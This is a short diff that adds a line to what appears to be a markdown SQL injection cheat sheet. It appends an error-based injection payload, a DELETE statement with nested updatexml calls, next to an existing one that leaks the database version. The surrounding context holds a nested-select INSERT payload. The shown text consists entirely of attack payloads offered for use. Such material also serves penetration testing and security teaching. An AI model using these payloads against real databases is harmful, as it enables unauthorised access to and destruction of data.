@@ -49,6 +49,8 @@ insert into users (id, username, password) values (1,"*(select*from(select(name_
   *  Delete:
   ```
     DELETE FROM users WHERE id = 1 OR updatexml(1, concat(0x7e, version()), 0);
+    DELETE FROM users WHERE id = 1 OR updatexml(1, '//a', updatexml(1, concat(0x7e, version()), 1))
+
   ```
   * Update:
   ```
